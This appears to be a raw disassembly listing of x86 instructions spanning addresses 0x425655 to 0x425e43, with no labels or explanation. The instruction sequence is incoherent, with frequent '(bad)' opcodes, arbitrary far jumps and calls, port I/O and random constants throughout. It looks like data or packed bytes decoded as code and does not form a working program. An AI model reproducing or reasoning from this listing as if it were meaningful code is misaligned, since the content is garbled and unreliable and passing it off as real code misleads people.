  425655:	xchg   DWORD PTR [eax],edi
  425657:	cdq    
  425658:	loop   0x425641
  42565a:	cmp    dl,BYTE PTR [ebp-0xc]
  42565d:	jbe    0x425632
  42565f:	cmp    esi,DWORD PTR [eax+esi*8]
  425662:	rcr    al,1
  425664:	pusha  
  425665:	mov    ecx,0x51135115
  42566a:	loop   0x425629
  42566c:	jp     0x425606
  42566e:	cli    
  42566f:	lock leave 
  425671:	mov    eax,0xbb4bd60d
  425676:	setbe  BYTE PTR [edi+0x13]
  42567a:	in     al,0xfd
  42567c:	ret    0xa24a
  42567f:	test   al,0x67
  425681:	test   DWORD PTR [edi+0x1f],edi
  425684:	out    dx,eax
  425685:	ret    0x6acf
  425688:	clc    
  425689:	sub    DWORD PTR [ebx-0x151bb1bc],edi
  42568f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425690:	xchg   BYTE PTR [ebp+0x4e],ah
  425693:	les    edx,FWORD PTR [ecx]
  425695:	pop    esi
  425696:	sbb    eax,0x35b43393
  42569b:	xor    ebp,ecx
  42569d:	fiadd  WORD PTR [edi]
  42569f:	dec    ecx
  4256a0:	sbb    edx,DWORD PTR [esi+0x5]
  4256a3:	fs adc al,0xeb
  4256a6:	jae    0x42565f
  4256a8:	shl    ecx,1
  4256aa:	fwait
  4256ab:	inc    esi
  4256ac:	dec    esp
  4256ad:	mov    esi,0x728ede54
  4256b2:	clc    
  4256b3:	push   eax
  4256b4:	adc    eax,DWORD PTR [ebp-0x43]
  4256b7:	and    al,ah
  4256b9:	adc    DWORD PTR [edi+eax*4+0x4752db13],edi
  4256c0:	and    BYTE PTR [ecx-0x3f3f1bc],ah
  4256c6:	and    bl,BYTE PTR [ebp+eax*8-0x608e31a1]
  4256cd:	sar    DWORD PTR [eax-0x5da4829c],cl
  4256d3:	imul   edx,esp,0xffffffba
  4256d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4256d7:	and    DWORD PTR [edi+0x7],eax
  4256da:	call   0x66e:0x6ca35221
  4256e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4256e2:	in     al,0x29
  4256e4:	sbb    al,0xb2
  4256e6:	sub    esi,DWORD PTR [eax-0x7d]
  4256e9:	fmul   QWORD PTR [ecx+0x1d]
  4256ec:	xor    eax,0x6eda222e
  4256f1:	or     eax,0x1fedb1b4
  4256f6:	ins    DWORD PTR es:[edi],dx
  4256f7:	jmp    0x66e1:0x8431bd8a
  4256fe:	mov    esp,0x30c168db
  425703:	repnz sub ah,dl
  425706:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425707:	call   0xad44fe3a
  42570c:	lods   eax,DWORD PTR ds:[esi]
  42570d:	mov    gs,esi
  42570f:	ins    BYTE PTR es:[edi],dx
  425710:	repz call 0x8e71:0x6a5ba8c5
  425718:	and    esi,ecx
  42571a:	mov    bl,0xb4
  42571c:	nop
  42571d:	jns    0x4256cf
  42571f:	pop    ss
  425720:	mov    ebx,fs
  425722:	and    al,0xd5
  425724:	pop    ss
  425725:	hlt    
  425726:	test   DWORD PTR [edi-0x592cbafa],0x865d7855
  425730:	jp     0x425761
  425732:	pushf  
  425733:	std    
  425734:	or     al,BYTE PTR [edi-0x36]
  425737:	cld    
  425738:	loope  0x4256df
  42573a:	adc    ebp,DWORD PTR [eax]
  42573c:	push   0x63a19615
  425741:	cmp    eax,DWORD PTR [ecx]
  425743:	mov    ds:0x78422951,al
  425748:	clc    
  425749:	mov    bh,0xcc
  42574b:	(bad)  
  42574c:	mov    al,0x3
  42574e:	mov    ah,0x2
  425750:	mov    DWORD PTR [ebx+0x53],eax
  425753:	xchg   DWORD PTR [ecx-0x6a],esp
  425756:	jl     0x425769
  425758:	add    esi,DWORD PTR [ecx+0x75]
  42575b:	dec    esi
  42575c:	mov    ebx,0xa98eb29e
  425761:	(bad)  
  425762:	mov    ah,0x9f
  425764:	inc    ebp
  425765:	pop    esp
  425766:	xchg   ebx,eax
  425767:	sbb    DWORD PTR [ecx],ecx
  425769:	pop    es
  42576a:	jnp    0x4257ce
  42576c:	inc    edx
  42576d:	or     ebx,esi
  42576f:	shl    BYTE PTR [edx+esi*8],0xc1
  425773:	lods   al,BYTE PTR ds:[esi]
  425774:	push   esp
  425775:	sbb    ch,BYTE PTR [edx]
  425777:	mov    WORD PTR [ebp+eax*1-0x6e],?
  42577b:	pusha  
  42577c:	mov    ds:0xcf8cce56,eax
  425781:	sub    BYTE PTR [edi],dl
  425783:	inc    ebp
  425784:	outs   dx,BYTE PTR ds:[esi]
  425785:	(bad)  
  425786:	jmp    0x42571b
  425788:	out    dx,eax
  425789:	in     al,0x78
  42578b:	xor    eax,0xfdfea020
  425790:	popf   
  425791:	xor    eax,0xe5c3fc6b
  425796:	jmp    FWORD PTR [ebx]
  425798:	dec    eax
  425799:	and    ah,BYTE PTR [edx-0x4b]
  42579c:	shl    BYTE PTR [edi-0x6b],cl
  42579f:	daa    
  4257a0:	add    eax,0x60946d7e
  4257a5:	xchg   ebp,eax
  4257a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4257a7:	or     al,0xaa
  4257a9:	cli    
  4257aa:	sbb    ah,dl
  4257ac:	and    esp,ebp
  4257ae:	adc    al,0xe2
  4257b0:	push   eax
  4257b1:	add    al,0x31
  4257b3:	pop    edx
  4257b4:	mov    BYTE PTR [edi*8-0x668aec64],al
  4257bb:	mov    ebx,0xcc84bc97
  4257c0:	test   al,0xa9
  4257c2:	daa    
  4257c3:	popf   
  4257c4:	(bad)  
  4257c5:	shr    dl,cl
  4257c7:	jle    0x4257a5
  4257c9:	mov    ebx,0x4b700049
  4257ce:	mov    DWORD PTR [edi+0x1af89a2f],edi
  4257d4:	cmp    eax,DWORD PTR [ebp+0x64]
  4257d7:	inc    ebp
  4257d8:	pop    edx
  4257d9:	outs   dx,DWORD PTR ds:[esi]
  4257da:	inc    esp
  4257db:	cmp    bh,dl
  4257dd:	and    eax,0x67dfcfd
  4257e2:	test   DWORD PTR [ebp+0x5c8b1f9f],edi
  4257e8:	rcl    BYTE PTR [eax],cl
  4257ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4257eb:	into   
  4257ec:	xchg   esp,eax
  4257ed:	pop    eax
  4257ee:	inc    ecx
  4257ef:	adc    al,0x81
  4257f1:	fcom   DWORD PTR [edi+0x4c]
  4257f4:	aad    0x13
  4257f6:	dec    esi
  4257f7:	push   ss
  4257f8:	pop    ecx
  4257f9:	rcr    ebx,1
  4257fb:	pop    ss
  4257fc:	mov    esp,0xa64a8318
  425801:	in     eax,0x8f
  425803:	push   0x3a256af9
  425808:	add    eax,0xd98d7cfd
  42580d:	mov    eax,0xe5bcb4f7
  425812:	and    dh,BYTE PTR [esi+0xe]
  425815:	sbb    BYTE PTR [esi-0x7310ce12],ch
  42581b:	dec    ebx
  42581c:	mov    ah,0xac
  42581e:	xlat   BYTE PTR ds:[ebx]
  42581f:	neg    BYTE PTR [edi]
  425821:	(bad)  
  425822:	shr    DWORD PTR es:[edi+eiz*8],cl
  425826:	gs hlt 
  425828:	out    dx,eax
  425829:	pop    ecx
  42582a:	xor    DWORD PTR [edx+ebp*4+0x55037634],0x23b98d6d
  425835:	aad    0xd6
  425837:	add    al,0x1a
  425839:	bnd jo 0x42589a
  42583c:	fiadd  DWORD PTR [ebx-0x5a]
  42583f:	jo     0x425818
  425841:	cs leave 
  425843:	mov    ebp,0x408ec2d3
  425848:	push   edx
  425849:	out    0x53,eax
  42584b:	mov    gs,WORD PTR [ecx+0x57]
  42584e:	in     eax,dx
  42584f:	push   esi
  425850:	test   al,0xfc
  425852:	add    BYTE PTR [eax],dl
  425854:	enter  0x5867,0x59
  425858:	les    ecx,FWORD PTR [ecx]
  42585a:	jns    0x4258d0
  42585c:	in     al,0xfc
  42585e:	add    BYTE PTR [eax],al
  425860:	add    BYTE PTR [eax],al
  425862:	add    eax,0xaf44af85
  425867:	outs   dx,BYTE PTR ds:[esi]
  425868:	out    dx,eax
  425869:	lds    ecx,FWORD PTR [ecx+0x7d5d36f8]
  42586f:	cld    
  425870:	pop    eax
  425871:	addr16 adc eax,0xf40001d1
  425877:	add    al,0x0
  425879:	add    BYTE PTR [ebp+edi*2+0x60],ch
  42587d:	jmp    0xcc4e:0xb13ba0ee
  425884:	cmp    eax,0x7bcbb115
  425889:	pop    edx
  42588a:	out    0x72,al
  42588c:	mov    ecx,0x405008e1
  425891:	out    dx,eax
  425892:	imul   ebp,DWORD PTR [esi+0x1f6e49d4],0x69
  425899:	shl    DWORD PTR ds:0x90f71481,0xd8
  4258a0:	icebp  
  4258a1:	arpl   WORD PTR [ebp-0x31023fb],sp
  4258a7:	cdq    
  4258a8:	pop    ebp
  4258a9:	jmp    0x425844
  4258ab:	or     DWORD PTR [eax-0x13da1314],0x1f142488
  4258b5:	xlat   BYTE PTR es:[ebx]
  4258b7:	pop    esi
  4258b8:	pop    edx
  4258b9:	stc    
  4258ba:	xchg   eax,edx
  4258bc:	jmp    0x89b9:0x37267dce
  4258c3:	stos   DWORD PTR es:[edi],eax
  4258c4:	sub    BYTE PTR [ecx+0x54b0ee9d],dl
  4258ca:	sub    BYTE PTR [ebp-0x18e4ae0b],dh
  4258d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4258d1:	and    eax,0xc6e78e8e
  4258d6:	rcr    DWORD PTR [eax-0x19],cl
  4258d9:	loope  0x42595a
  4258db:	push   ds
  4258dc:	mov    WORD PTR [edi+ecx*4-0x1c],ds
  4258e0:	pushf  
  4258e1:	popa   
  4258e2:	in     eax,0xa0
  4258e4:	jae    0x425946
  4258e6:	jle    0x42589a
  4258e8:	cli    
  4258e9:	jecxz  0x4258fc
  4258eb:	pop    ecx
  4258ec:	pop    ds
  4258ed:	mov    DWORD PTR [ecx-0x17],0xfb2aa6d3
  4258f4:	add    eax,0xd6433220
  4258f9:	xor    edi,edx
  4258fb:	popa   
  4258fc:	js     0x4258af
  4258fe:	fld    DWORD PTR [ebx-0x5b466fa4]
  425904:	les    edx,FWORD PTR [ebx+0x6e9d6db9]
  42590a:	std    
  42590b:	push   ecx
  42590c:	pop    ss
  42590d:	pop    edx
  42590e:	add    al,0x2e
  425910:	aas    
  425911:	jecxz  0x425919
  425913:	sbb    eax,0x186cfac1
  425918:	lods   eax,DWORD PTR ds:[esi]
  425919:	fsub   st,st(2)
  42591b:	dec    ecx
  42591c:	or     bl,BYTE PTR [esi]
  42591e:	gs jae 0x42596f
  425921:	in     al,dx
  425922:	mul    BYTE PTR [esi+0xa3e5305]
  425928:	(bad)  
  425929:	cwde   
  42592a:	fadd   st,st(5)
  42592c:	neg    BYTE PTR [edx-0x5be73941]
  425932:	fnstsw WORD PTR [esi]
  425934:	fisttp QWORD PTR gs:[ecx-0x66db35e5]
  42593b:	fisttp QWORD PTR [edi]
  42593d:	cmp    cl,cl
  42593f:	jne    0x425905
  425941:	jg     0x425904
  425943:	mov    esp,0xba500ca6
  425948:	add    al,0x29
  42594a:	cmp    esp,ebx
  42594c:	jns    0x425933
  42594e:	rol    esi,0x0
  425951:	sbb    DWORD PTR [ebp+0x6787c92b],eax
  425957:	stc    
  425958:	mov    ds:0xef9326cf,al
  42595d:	add    eax,0xfd6cfb79
  425962:	jmp    0x4259b5
  425964:	or     ebx,DWORD PTR [edx-0xd]
  425967:	fs int3 
  425969:	jne    0x425990
  42596b:	xor    ax,0x13ca
  42596f:	mov    bl,0x43
  425971:	sbb    al,0x90
  425973:	(bad)  
  425974:	idiv   DWORD PTR [esi-0x34]
  425977:	xchg   edi,eax
  425978:	or     eax,0xc5e29daa
  42597d:	aad    0x93
  42597f:	scas   al,BYTE PTR es:[edi]
  425980:	mov    edx,0xa05f1841
  425985:	dec    edx
  425986:	jb     0x425928
  425988:	aam    0xec
  42598a:	mov    dl,0xba
  42598c:	call   0xde373073
  425991:	jae    0x425953
  425993:	(bad)  
  425994:	and    ebx,DWORD PTR [ecx-0x4697e01d]
  42599a:	jge    0x425921
  42599c:	push   es
  42599d:	bswap  edi
  42599f:	sub    BYTE PTR [ecx+0x74c92e8d],bl
  4259a5:	fnstenv [edi-0x3cc91cda]
  4259ab:	add    eax,0xa026d43b
  4259b0:	add    edi,DWORD PTR ds:0x91aafc87
  4259b6:	movzx  ebx,BYTE PTR [ebx-0x614d0fd0]
  4259bd:	leave  
  4259be:	(bad)  
  4259bf:	sbb    ch,BYTE PTR [eax+0x1464d1f9]
  4259c5:	or     BYTE PTR [edx+0x674b58ed],dl
  4259cb:	pop    ebp
  4259cc:	sub    ch,BYTE PTR [edx+ebp*8-0x7f]
  4259d0:	je     0x4259d1
  4259d2:	jecxz  0x4259f4
  4259d4:	inc    edx
  4259d5:	cmp    ebx,ecx
  4259d7:	pushf  
  4259d8:	int    0xd8
  4259da:	(bad)  
  4259db:	pop    esp
  4259dc:	mov    al,ds:0x398f54e8
  4259e1:	jmp    0xd423:0xc1dbe03f
  4259e8:	enter  0x428,0xb5
  4259ec:	js     0x4259aa
  4259ee:	jne    0x4259b7
  4259f0:	gs daa 
  4259f2:	inc    edx
  4259f3:	ret    0x2b7c
  4259f6:	inc    ebx
  4259f7:	hlt    
  4259f8:	pushf  
  4259f9:	xchg   esi,eax
  4259fa:	mov    al,0xa3
  4259fc:	jle    0x4259e8
  4259fe:	fstp   DWORD PTR es:[ebp+0x4a]
  425a02:	fimul  DWORD PTR [ebx-0x1f30086b]
  425a08:	call   0xa3f2:0x949928f0
  425a0f:	test   DWORD PTR [edx-0x41c32ebe],0xef8245e5
  425a19:	sub    ecx,DWORD PTR [eax]
  425a1b:	or     al,0xe5
  425a1d:	test   DWORD PTR [esi-0x3e02b8f2],esi
  425a23:	pop    esp
  425a24:	push   edi
  425a25:	and    ecx,DWORD PTR [ecx+0x47356985]
  425a2b:	or     ch,BYTE PTR [esi+0x3a6fc371]
  425a31:	leave  
  425a32:	sub    BYTE PTR [edx+0xa6a7fb3],0x4f
  425a39:	jl     0x4259d2
  425a3b:	add    BYTE PTR [ecx],ah
  425a3d:	xchg   ebp,eax
  425a3e:	push   ebx
  425a3f:	imul   esp,DWORD PTR [esi+0x3313cd5d],0x8d2c73e
  425a49:	jns    0x425a65
  425a4b:	cld    
  425a4c:	mov    fs,ebp
  425a4e:	mov    al,0x6d
  425a50:	pop    edi
  425a51:	push   cs
  425a52:	jl     0x4259f0
  425a54:	pop    ss
  425a55:	and    esp,DWORD PTR [edi]
  425a57:	mov    BYTE PTR [ebx+eax*2],cl
  425a5a:	cmp    DWORD PTR [edi+esi*2+0x3cd93e49],edi
  425a61:	jl     0x425ae0
  425a63:	sub    al,al
  425a65:	pop    esi
  425a66:	add    ah,BYTE PTR [ebx+0x702e1988]
  425a6c:	test   al,0xa9
  425a6e:	sbb    al,0x41
  425a70:	lods   al,BYTE PTR ds:[esi]
  425a71:	sbb    esi,DWORD PTR [eax]
  425a73:	daa    
  425a74:	es sahf 
  425a76:	in     al,0x21
  425a78:	inc    ebp
  425a79:	xchg   edi,eax
  425a7a:	and    BYTE PTR [esi],al
  425a7c:	and    DWORD PTR [edx+0xb284909],esi
  425a82:	fidivr WORD PTR [edi+0x24]
  425a85:	popf   
  425a86:	mov    BYTE PTR [edi-0xb],bh
  425a89:	ficomp DWORD PTR ds:[edi+0x56d725d2]
  425a90:	mov    ah,BYTE PTR [esi+ebx*2-0x21343122]
  425a97:	push   esi
  425a98:	stos   DWORD PTR es:[edi],eax
  425a99:	int3   
  425a9a:	adc    eax,0xc06f30ac
  425a9f:	adc    cl,BYTE PTR [esi+0x653d0b1f]
  425aa5:	mov    edx,0x2e0cdeeb
  425aaa:	mov    ch,0x89
  425aac:	scas   eax,DWORD PTR es:[edi]
  425aad:	fpatan 
  425aaf:	cmp    dl,dh
  425ab1:	sub    cl,BYTE PTR [eax-0x24]
  425ab4:	jle    0x425b04
  425ab6:	pop    ds
  425ab7:	pusha  
  425ab8:	xchg   edx,eax
  425ab9:	jmp    0xf6bd:0x5a4760ee
  425ac0:	push   ss
  425ac1:	div    BYTE PTR [ebx]
  425ac3:	clc    
  425ac4:	pop    ss
  425ac5:	dec    ebp
  425ac6:	fiadd  WORD PTR [eax+0x45029085]
  425acc:	inc    ebx
  425acd:	fs xchg ebp,eax
  425acf:	mov    eax,ds:0x6932ccbe
  425ad4:	ret    
  425ad5:	popa   
  425ad6:	jo     0x425a75
  425ad8:	push   ss
  425ad9:	in     al,0x3f
  425adb:	fsubr  DWORD PTR [ecx*8+0x3d7d8e26]
  425ae2:	mov    ds,WORD PTR ds:0x19aebb8b
  425ae8:	in     eax,dx
  425ae9:	and    al,0x9a
  425aeb:	outs   dx,DWORD PTR ds:[esi]
  425aec:	stos   DWORD PTR es:[edi],eax
  425aed:	sub    BYTE PTR [ebp+0x7a],ch
  425af0:	xor    BYTE PTR [esi+0x4b],al
  425af3:	fmul   QWORD PTR [edi-0xbded626]
  425af9:	(bad)  
  425afa:	push   es
  425afb:	xchg   ebx,eax
  425afc:	push   ss
  425afd:	mov    ah,0x15
  425aff:	jmp    0x425a95
  425b01:	xlat   BYTE PTR ds:[ebx]
  425b02:	enter  0x9b86,0xbd
  425b06:	fsubr  QWORD PTR [esi]
  425b08:	jp     0x425a99
  425b0a:	lea    ebp,[ebx-0x64]
  425b0d:	jle    0x425b7a
  425b0f:	inc    ebp
  425b10:	push   0xfffffff8
  425b12:	xchg   esp,eax
  425b13:	es aad 0x42
  425b16:	or     DWORD PTR [edi+0x36],ebp
  425b19:	or     ch,BYTE PTR [edi+ebx*1-0x70]
  425b1d:	mov    BYTE PTR [esi],ah
  425b1f:	lds    ebp,FWORD PTR [ebp+0x3659eaff]
  425b25:	stos   BYTE PTR es:[edi],al
  425b26:	xor    eax,0x12229242
  425b2b:	popf   
  425b2c:	(bad)  
  425b2d:	cmp    dh,dh
  425b2f:	push   esi
  425b30:	dec    eax
  425b31:	pop    ds
  425b32:	scas   al,BYTE PTR es:[edi]
  425b33:	icebp  
  425b34:	loope  0x425bab
  425b36:	sub    al,0xb4
  425b38:	cmp    DWORD PTR [ecx],0xa89024cb
  425b3e:	jecxz  0x425b30
  425b40:	repz enter 0xc51c,0xe8
  425b45:	(bad)  
  425b46:	mov    esi,0xb5656e22
  425b4b:	clc    
  425b4c:	cdq    
  425b4d:	push   esi
  425b4e:	mov    ecx,0xf10b911a
  425b53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425b54:	mov    bl,ch
  425b56:	dec    ebx
  425b57:	sbb    eax,0x61ca9544
  425b5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425b5d:	add    edi,DWORD PTR [eax-0x2b]
  425b60:	adc    al,0x7c
  425b62:	pop    esp
  425b63:	imul   ebp,edx,0x1845a364
  425b69:	fiadd  DWORD PTR [edx-0x74]
  425b6c:	or     edx,DWORD PTR [eax]
  425b6e:	test   ah,bl
  425b70:	add    eax,DWORD PTR [edx+0x4e]
  425b73:	pop    ss
  425b74:	ror    DWORD PTR [edx],1
  425b76:	stos   BYTE PTR es:[edi],al
  425b77:	add    al,0x30
  425b79:	pop    edx
  425b7a:	pop    ebx
  425b7b:	lea    edx,[eax+0x62c8267]
  425b81:	fld    DWORD PTR [ebx+eiz*2+0x12a58f1b]
  425b88:	repz mov ds:0x9b2527d2,eax
  425b8e:	scas   al,BYTE PTR es:[edi]
  425b8f:	jle    0x425bcf
  425b91:	pop    ecx
  425b92:	xchg   edx,eax
  425b93:	inc    esp
  425b94:	mov    eax,ds:0x9ff01001
  425b99:	and    ah,BYTE PTR [ebx]
  425b9b:	loope  0x425be7
  425b9d:	jmp    0x16bd:0x2ea5a227
  425ba4:	push   es
  425ba5:	sbb    esp,DWORD PTR [ecx]
  425ba7:	call   0x64179619
  425bac:	or     DWORD PTR [eax-0x3a],ebx
  425baf:	sbb    eax,0x7899af4d
  425bb4:	in     al,0x92
  425bb6:	pop    ecx
  425bb7:	xor    BYTE PTR ss:[ebx],0xb8
  425bbb:	or     al,0x96
  425bbd:	cmp    dh,BYTE PTR [esi]
  425bbf:	call   0x96e8:0x6c91f303
  425bc6:	adc    BYTE PTR [esi+0x517059a3],0xb
  425bcd:	xchg   esi,eax
  425bce:	inc    ebx
  425bcf:	sbb    DWORD PTR [edi],0xffffffee
  425bd2:	mov    DWORD PTR [edx-0x518fa753],0x7a0a24de
  425bdc:	(bad)  
  425bdd:	cli    
  425bde:	mov    ebp,0x4f9ac62d
  425be3:	sbb    eax,0xd2e9bfbe
  425be8:	cmp    dl,ah
  425bea:	add    ebx,ebp
  425bec:	(bad)
  425bf0:	dec    ebx
  425bf1:	xchg   DWORD PTR [ebx+ebx*1+0x30b11885],eax
  425bf8:	dec    eax
  425bf9:	scas   al,BYTE PTR es:[edi]
  425bfa:	mov    ebx,0xeca89473
  425bff:	ret    
  425c00:	stc    
  425c01:	nop
  425c02:	ja     0x425c30
  425c04:	(bad)  
  425c05:	(bad)  
  425c06:	pop    esp
  425c07:	sbb    DWORD PTR [ecx+0x6b51572f],ebp
  425c0d:	repz clc 
  425c0f:	jmp    0x425c67
  425c11:	fisubr WORD PTR [ebx+0x77071d]
  425c17:	xchg   edx,eax
  425c18:	sub    bl,dh
  425c1a:	dec    esp
  425c1b:	xor    ebx,DWORD PTR [ebx]
  425c1d:	adc    al,0x13
  425c1f:	push   esp
  425c20:	(bad)  
  425c21:	mov    ds:0xce0f1787,al
  425c26:	jge    0x425c6d
  425c28:	push   ebp
  425c29:	call   0xb0850a0d
  425c2e:	ss or  eax,0x94bc23e1
  425c34:	dec    eax
  425c35:	clc    
  425c36:	jecxz  0x425c38
  425c38:	ins    BYTE PTR es:[edi],dx
  425c39:	mov    dh,BYTE PTR [esp+eax*8]
  425c3c:	in     al,dx
  425c3d:	(bad)  
  425c3f:	cmp    al,0x81
  425c41:	jle    0x425c57
  425c43:	and    eax,0x8f20b9a
  425c48:	jno    0x425cae
  425c4a:	jl     0x425be4
  425c4c:	(bad)  
  425c4d:	xchg   edx,eax
  425c4e:	rcl    DWORD PTR [esi],1
  425c50:	stc    
  425c51:	xor    ah,BYTE PTR [eax+0x1bb4a909]
  425c57:	fs push 0x1c268929
  425c5d:	(bad)  [eax]
  425c5f:	jmp    0x3d54ea50
  425c64:	cli    
  425c65:	push   es
  425c66:	jecxz  0x425c93
  425c68:	and    al,0xd0
  425c6a:	mov    ch,BYTE PTR [ecx-0x10]
  425c6d:	add    al,BYTE PTR [ebx+0x255f71e6]
  425c73:	pop    edi
  425c74:	cmp    bh,dh
  425c76:	cmp    DWORD PTR [ecx-0x64],esi
  425c79:	(bad)  
  425c7a:	xor    al,0x40
  425c7c:	jge    0x425c7f
  425c7e:	(bad)  
  425c7f:	fxch   st(4)
  425c81:	inc    ecx
  425c82:	fs inc ecx
  425c84:	ss retf 0x6c1
  425c88:	sti    
  425c89:	mov    ds:0x6a28ab,eax
  425c8e:	mov    esp,0xb3e9fc0a
  425c93:	jb     0x425c6b
  425c95:	int3   
  425c96:	jb     0x425c5a
  425c98:	mov    DWORD PTR [ebx+ebp*4-0x6ef25465],ebp
  425c9f:	xchg   BYTE PTR [esi-0x794e5605],dh
  425ca5:	pop    eax
  425ca6:	std    
  425ca7:	loope  0x425d28
  425ca9:	mov    al,0x11
  425cab:	rcl    DWORD PTR [ecx-0x54],cl
  425cae:	mov    ecx,0x7a2999f4
  425cb3:	retf   0x69ab
  425cb6:	push   edi
  425cb7:	loopne 0x425ceb
  425cb9:	sahf   
  425cba:	ds aad 0x3f
  425cbd:	push   0x11
  425cbf:	add    eax,0x9b8600bf
  425cc4:	ja     0x425ce4
  425cc6:	inc    esp
  425cc7:	add    DWORD PTR [ecx],esi
  425cc9:	inc    esp
  425cca:	out    0x8e,eax
  425ccc:	bound  ecx,QWORD PTR ss:[edx]
  425ccf:	loop   0x425d45
  425cd1:	or     al,0x0
  425cd3:	cmp    bh,BYTE PTR [eax-0x7d]
  425cd6:	(bad)  
  425cd8:	sbb    BYTE PTR [esi+0x5c845a24],dl
  425cde:	jg     0x425d24
  425ce0:	mov    ebp,0x41c0113b
  425ce5:	aas    
  425ce6:	sbb    DWORD PTR [ecx+0x3],ebx
  425ce9:	in     eax,0xd5
  425ceb:	js     0x425d2f
  425ced:	mov    BYTE PTR [ebp-0x363915ca],0xfd
  425cf4:	jmp    DWORD PTR [esi-0x54]
  425cf7:	xor    eax,0xf17a1f19
  425cfc:	mov    dl,0x44
  425cfe:	inc    edx
  425cff:	dec    edx
  425d00:	push   eax
  425d01:	pop    ecx
  425d02:	shl    DWORD PTR ds:0xd90903e7,cl
  425d08:	inc    eax
  425d09:	iret   
  425d0a:	and    ebx,DWORD PTR [eax+0x38]
  425d0d:	or     eax,0x6d9da563
  425d12:	sbb    al,0xc4
  425d14:	dec    esi
  425d15:	or     dl,bh
  425d17:	and    edx,DWORD PTR [edx-0xfe08b66]
  425d1d:	xchg   edi,eax
  425d1e:	pop    esp
  425d1f:	jnp    0x425d3c
  425d21:	dec    ebp
  425d22:	sbb    al,0x48
  425d24:	test   al,0xa5
  425d26:	jbe    0x425d1b
  425d28:	xchg   esi,eax
  425d29:	sub    ch,dh
  425d2b:	and    al,bl
  425d2d:	push   ebx
  425d2e:	mov    ch,BYTE PTR [ebx-0x6d6ece58]
  425d34:	dec    ecx
  425d35:	retf   
  425d36:	sar    DWORD PTR [ebp+0x52b147ce],cl
  425d3c:	sbb    eax,0x3e3aca82
  425d41:	stos   DWORD PTR es:[edi],eax
  425d42:	sti    
  425d43:	pop    ss
  425d44:	lods   eax,DWORD PTR ds:[esi]
  425d45:	cmp    esp,esi
  425d47:	daa    
  425d48:	and    DWORD PTR [eax+0x54],edx
  425d4b:	adc    DWORD PTR [ebx-0x44],ebp
  425d4e:	mov    al,0x6a
  425d50:	mov    al,0x38
  425d52:	ins    DWORD PTR es:[edi],dx
  425d53:	xchg   dl,bh
  425d55:	add    al,0x69
  425d57:	(bad)  
  425d58:	hlt    
  425d59:	dec    edx
  425d5a:	jg     0x425cec
  425d5c:	push   ecx
  425d5d:	in     al,dx
  425d5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425d5f:	cmp    al,0x5a
  425d61:	pop    edx
  425d62:	frstor [ebp-0x22224e8]
  425d68:	inc    ebp
  425d69:	int3   
  425d6a:	pop    edi
  425d6b:	sbb    eax,0xf3a
  425d70:	add    BYTE PTR [eax],al
  425d72:	out    dx,al
  425d73:	retf   0xd589
  425d76:	lods   eax,DWORD PTR ds:[esi]
  425d77:	xlat   BYTE PTR ds:[ebx]
  425d78:	(bad)  
  425d79:	sti    
  425d7a:	(bad)  
  425d7c:	mov    ss,WORD PTR [esp+ebp*1+0x64]
  425d80:	or     ah,ch
  425d82:	or     esi,edx
  425d84:	add    DWORD PTR [eax],eax
  425d86:	hlt    
  425d87:	add    al,0x0
  425d89:	add    BYTE PTR [ecx+0x4d],dl
  425d8c:	xchg   edi,eax
  425d8d:	sbb    ebx,edi
  425d8f:	cmp    ah,ch
  425d91:	jp     0x425dda
  425d93:	pop    ebp
  425d94:	and    al,0x38
  425d96:	pop    edx
  425d97:	data16 jecxz 0x425d9a
  425d9a:	xor    DWORD PTR [edx+eiz*1-0x6a],ebp
  425d9e:	and    eax,0x9a7c8952
  425da3:	add    al,0x9b
  425da5:	mov    esp,0xaf661517
  425daa:	outs   dx,DWORD PTR ds:[esi]
  425dab:	rcl    DWORD PTR [eax-0x45dd2f99],cl
  425db1:	push   esp
  425db2:	(bad)  
  425db3:	adc    DWORD PTR [edx+0xf92b21],edi
  425db9:	xor    BYTE PTR [edx+0x7c26dcf8],bl
  425dbf:	imul   edi,DWORD PTR [ebp-0x4c6eb0a3],0x33
  425dc6:	mov    ah,0x60
  425dc8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425dc9:	aad    0xb9
  425dcb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425dcc:	std    
  425dcd:	mov    edi,0xdfab2230
  425dd2:	xchg   edi,eax
  425dd3:	sbb    cl,BYTE PTR [edx]
  425dd5:	mov    ebp,0x5d3a6924
  425dda:	adc    ecx,DWORD PTR [edi+ebp*4+0x5c]
  425dde:	test   DWORD PTR es:[ebx+0x27],ecx
  425de2:	daa    
  425de3:	call   0x3a7edf6f
  425de8:	cdq    
  425de9:	ja     0x425d80
  425deb:	call   0x491877b
  425df0:	pop    esp
  425df1:	and    esp,eax
  425df3:	jbe    0x425d9d
  425df5:	jno    0x425da3
  425df7:	xchg   BYTE PTR [eax],bh
  425df9:	jo     0x425e67
  425dfb:	jle    0x425e36
  425dfd:	sub    cl,BYTE PTR [esi-0x1fbd7cb7]
  425e03:	mov    gs,edx
  425e05:	call   0x3e00e0c3
  425e0a:	sbb    dl,BYTE PTR [edx+0x1d]
  425e0d:	push   ebp
  425e0e:	adc    eax,0x38bbd026
  425e13:	rol    DWORD PTR [esi],cl
  425e15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425e16:	aam    0x85
  425e18:	dec    edi
  425e19:	lods   al,BYTE PTR ds:[esi]
  425e1a:	push   ebx
  425e1b:	imul   esi,DWORD PTR ss:[ebx+0x6ff067ca],0xffffffad
  425e23:	xchg   esi,eax
  425e24:	not    BYTE PTR [ebx+eiz*1+0x3d]
  425e28:	mov    edi,0xa5ba589e
  425e2d:	call   0x4333:0x275f04e0
  425e34:	je     0x425dbd
  425e36:	mov    ch,0x57
  425e38:	fidiv  WORD PTR [esi]
  425e3a:	stc    
  425e3b:	(bad)  
  425e3c:	(bad)  
  425e3d:	cmc    
  425e3e:	icebp  
  425e3f:	in     eax,0x1c
  425e41:	jnp    0x425e06
  425e43:	inc    esi
